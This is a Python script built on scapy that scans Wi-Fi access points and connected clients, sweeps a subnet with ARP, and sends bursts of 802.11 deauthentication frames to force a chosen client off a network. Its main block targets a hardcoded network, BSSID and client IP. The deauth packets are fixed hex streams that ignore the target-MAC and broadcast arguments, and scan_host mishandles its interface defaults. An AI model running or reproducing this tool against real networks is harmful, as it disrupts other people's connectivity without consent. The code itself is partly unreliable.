import os
import sys
import threading
import subprocess
import logging


logging.basicConfig(filename=os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'log', 'sniff.log'),
                    level=logging.DEBUG,
                    format='%(asctime)s [%(levelname)s]%(message)s',
                    datefmt='%Y-%m-%d %H:%M:%S')

sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'scapy'))
from scapy.all import *  # noqa: E402

iface_managed = None
iface_monitor = None

class Network:
    def __init__(self, ssid: str, bssid: str, channel: int, crypto: set[str], gateway: str = None, subnet: int = None):
        self.ssid = ssid
        self.bssid = bssid
        self.channel = channel
        self.crypto = crypto
        self.gateway = gateway
        self.subnet = subnet

    def __str__(self):
        return ('[Network info] ssid:{}  bssid:{}  channel:{}  crypto:{}  gateway:{}  subnet:{}'
                .format(self.ssid, self.bssid, self.channel, self.crypto, self.gateway, self.subnet))

class Host:
    def __init__(self, bssid: str, MAC: str, IP: str):
        self.bssid = bssid
        self.MAC = MAC
        self.IP = IP

    def __str__(self):
        return ('[Host info] bssid:{}  MAC:{}  IP:{}'
                .format(self.bssid, self.MAC, self.IP))


# Recognizes and returns a list of network interface.
#   [Input] None
#   [Output] List of available network interface [Name, Description, MAC, IPv4]
def lookup_iface() -> list[NetworkInterface]:
    iface_list = []
    for guid, iface in conf.ifaces.data.items():
        if iface.mac != '':  # Windows에서 WAN Miniport 제외
            iface_list.append(iface)
    return iface_list


def get_connected_wifi_bssid(iface=None):
    if iface is None:
        iface = iface_managed
    system = sys.platform
    if system == 'win32':
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
            output = result.stdout

            interface_section = False
            bssid = None

            for line in output.split('\n'):
                if iface.name in line:
                    interface_section = True
                elif 'BSSID' in line and interface_section:
                    bssid = line[-17:]
                    break
                elif line.strip() == '':
                    interface_section = False
            return bssid
        except Exception as e:
            print(f"Error: {e}")
            return None
    elif system == 'linux':
        try:
            result = subprocess.run(['iwconfig', iface.name], capture_output=True, text=True)
            output = result.stdout
            bssid = None
            for line in output.split('\n'):
                if 'Access Point' in line:
                    bssid = line.split(' ')[-1].strip()
                    break
            return bssid
        except Exception as e:
            print(f"Error: {e}")
            return None
# Execute netsh command to connect to a Wi-Fi without a password you've already connected to.
#   [Input] Network ssid or bssid, Network interface to use
#   [Output] Success or not
def simple_connect_to_wifi(ssid, iface=None):
    if iface is None:
        iface = iface_managed
    command = f'netsh wlan connect ssid="{ssid}" name="{ssid}" interface="{iface.name}"'
    print()
    subprocess.run(command, shell=True)

    return True     # But this is a connection request success and does not guarantee the establishment of a connection.

# Send de-authentication frame to force disconnect a specific client or all clients connected to the target network
#   [Input] Network, Target Client MAC address, Broadcast or not, Network interface to use
#   [Output] None
def disconnect_client(network: Network, client_MAC: str = '', broadcast: bool = False, iface=None):
    def from_hexstream_to_packet(hexstream):
        packet = RadioTap(bytes.fromhex(hexstream))
        return packet
    def send_deauth_packet(packet, iface, count, inter):
        def produce_sc(frag: int, seq: int) -> int:
            return (seq << 4) + frag
        for seq_num in range(count):
            packet[Dot11].SC = produce_sc(0, seq_num)
            sendp(packet, iface=iface, monitor=True, count=1)
            packet.addr1, packet.addr2 = packet.addr2, packet.addr1  # Swap src, dst

    if iface is None:
        iface = iface_monitor
    if broadcast:
        client_MAC = 'ff:ff:ff:ff:ff:ff'
    '''
    deauth_packet_type1 = (RadioTap(present="Rate+TXFlags", Rate=1, TXFlags=0x0018)
                           / Dot11(ID=14849, addr1=client_MAC, addr2=network.bssid, addr3=network.bssid, SC=0)
                           / Dot11Deauth(reason=7))
    deauth_packet_type2 = (RadioTap(present="TXFlags+b18", notdecoded=b'\x00')
                     / Dot11(ID=14849, addr1=client_MAC, addr2=network.bssid, addr3=network.bssid)
                     / Dot11Deauth(reason=7))
    '''
    deauth_packet_type1 = from_hexstream_to_packet('00000c000480000002001800c0003a0104292e794a12588694a0b468588694a0b46800000700')
    deauth_packet_type2 = from_hexstream_to_packet('00000b0000800200000000c0003a0104292e794a12588694a0b468588694a0b46800000700')

    set_channel(network.channel, iface)
    thread1 = threading.Thread(target=send_deauth_packet, args=(deauth_packet_type1, iface, 100, 0.1))
    thread2 = threading.Thread(target=send_deauth_packet, args=(deauth_packet_type2, iface, 100, 0.1))
    thread1.start()
    thread2.start()
    thread1.join()
    thread2.join()


# Change the channel of the target network interface. (Only works in monitor mode.)
#   [Input] Channel number, Target interface
#   [Output] Success or failure
def set_channel(num: int, iface=None) -> bool:
    if iface is None:
        iface = iface_monitor
    if not iface.ismonitor():
        print("Cannot change channel. First you need to switch your iface to monitor mode.")
        return False
    else:
        iface.setchannel(num)   # WlanHelper "Wi-Fi 2" channel n
        # It actually works, but I can't check the changed channel number via command(WlanHelper "Wi-Fi 2" channel)
        return True  # But it's still possible that it failed... (responsibility of scapy)


# Scan access points while switching channels in the 2.4GHz and 5GHz bands.
#   [Input] Channel list for scanning, Frequency('2.4ghz' or '5ghz'), Passive/Active scan, Network interface to use
#   [Output] List of connectable networks (ssid, bssid, channel, crypto)
def scan_AP(channels: list[int] = None, frequency: str = None, active: bool = False, iface=None) -> list[Network]:
    if iface is None:
        iface = iface_monitor
    wifi_2_4_channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
    wifi_5_channels = [36, 40, 44, 48, 149, 153, 157, 161]  # in KOREA
    network_list = []
    current_channel = 0

    # Callback function that executes with each packet sniffed.
    def handle_scan_AP(packet):
        try:
            # Passive Scan
            if packet.haslayer(Dot11Beacon):  # Beacon Frame
                netstats = packet[Dot11Beacon].network_stats()
                if ('channel' in netstats and netstats[
                    'channel'] == current_channel  # Discard frames from other channels
                        and packet.addr3 not in [network.bssid for network in network_list]):
                    network_list.append(Network(
                        netstats['ssid'],
                        packet.addr3,
                        netstats['channel'],
                        netstats['crypto']
                    ))
                    print(network_list[-1])
            '''
            if active:  # Active Scan
                if packet.type == 0 and (packet.subtype == 4 or packet.subtype == 5):    # Probe Request/Response Frame
                    ...
                    print('Sorry, active scanning is currently not supported.')
            '''
        except (KeyError, TypeError) as e:  # Probably a malformed packet
            ...

    if channels is None:
        if frequency is None:
            channels = wifi_2_4_channels + wifi_5_channels
        elif frequency.lower() == '2.4ghz':
            channels = wifi_2_4_channels
        elif frequency.lower() == '5ghz':
            channels = wifi_5_channels

    print('Start passive scan')

    for n in channels:
        # Sequential channel switching - Stays for 1 second on each channel
        current_channel = n
        print('Current channel: %d' % n)
        set_channel(n, iface)
        # 비콘 프레임은 보통 100ms마다 송신되기 때문에 timeout=0.1~0.2여도 충분할 것 같다.
        sniff(iface=iface, monitor=True, timeout=0.5, prn=handle_scan_AP, store=0)
    return network_list


# Scan client devices connected to a specific network.
#   [Input] Target network, Network interface to use
#   [Output] Information list of client devices ( )
def scan_host(network: Network, iface_man=None, iface_mon=None) -> list[Host]:
    if iface_man is None:
        iface = iface_managed
    if iface_mon is None:
        iface = iface_monitor
    host_list = _scan_host_MAC(network, iface_mon)
    host_list = _scan_host_IP(host_list, network, iface_man)
    return host_list


# Scan MAC addresses of client devices
def _scan_host_MAC(network: Network, iface=None) -> list[dict]:
    if iface is None:
        iface = iface_monitor
    host_list = []
    # Callback function that executes with each packet sniffed.
    def handle_scan_host_MAC(packet):
        try:
            if packet.haslayer(Dot11):
                if (packet.type == 0 and packet.subtype == 4  # Probe Request Frame (Occurs only on new connection)
                        and packet.addr3 == network.bssid):
                    if packet.addr2 not in [host.MAC for host in host_list]:
                        host_list.append(Host(network.bssid, packet.addr2, ''))
                        print(host_list[-1])
                elif (packet.type == 2  # Data Frame (But)
                      and packet.addr1 == network.bssid):  # Client -> AP (To DS=1, From DS=0)
                    if packet.addr2 not in [host.MAC for host in host_list]:
                        host_list.append(Host(network.bssid, packet.addr2, ''))
                        print(host_list[-1])
        except (KeyError, TypeError) as e:  # Probably a malformed packet
            ...

    set_channel(network.channel, iface)
    sniff(iface=iface, monitor=True, timeout=10, prn=handle_scan_host_MAC, store=0)
    return host_list


# Scan IP addresses of client devices
def _scan_host_IP(host_list: list[Host], network: Network, iface=None) -> list[dict]:
    _find_MAC_from_IP(host_list, network, iface)

    return host_list


# SScan IP with ARP Request/Response within subnet range
def _find_MAC_from_IP(host_list: list[Host], network: Network, iface=None):
    if iface is None:
        iface = iface_managed
    ARP_request = (Ether(dst='ff:ff:ff:ff:ff:ff', src=iface.mac, type='ARP')
                   / ARP(hwsrc=iface.mac, psrc=iface.ip, pdst='{}/{}'.format(network.gateway, network.subnet))[0])
    answered_list = srp(ARP_request, iface=iface, timeout=10)[0]
    for sent, received in answered_list:  # ARP Response
        appended = False
        for host in host_list:
            if received.hwsrc == host.MAC:
                host.IP = received.psrc
                appended = True
        if not appended:
            host_list.append(Host(network.bssid, received.hwsrc, received.psrc))

        print('{} - {}'.format(received.hwsrc, received.psrc))
    return host_list


if __name__ == '__main__':
    iface_list = lookup_iface()
    # Uses two interfaces: one connects to the target WiFi(Managed mode), the other monitors 802.11 frames(Monitor mode)
    iface_managed = next((i for i in iface_list if i.name == 'Wi-Fi'), None)
    iface_managed.setmonitor(False)
    iface_monitor = next((i for i in iface_list if i.name == 'Wi-Fi 2'), None)
    iface_monitor.setmonitor(True)
    '''
    network_list = scan_AP(frequency='2.4ghz', iface=iface_monitor)
    network = next((network for network in network_list if network.bssid == get_connected_wifi_bssid(iface=iface_managed)), None)
    # todo: need to find a way to automatically determine gateways and subnets.
    if network.gateway is None:
        network.gateway = '192.168.0.1'
    if network.subnet is None:
        network.subnet = 24
    '''
    network = Network('monodoo2.4', '58:86:94:a0:b4:68', 3, {'WPA2/PSK'}, '192.168.0.1', 24)

    set_channel(network.channel)
    host_list = scan_host(network=network)
    client_mac = [host.MAC for host in host_list if host.IP == '192.168.0.13'][0]
    disconnect_client(network=network, client_MAC=client_mac)
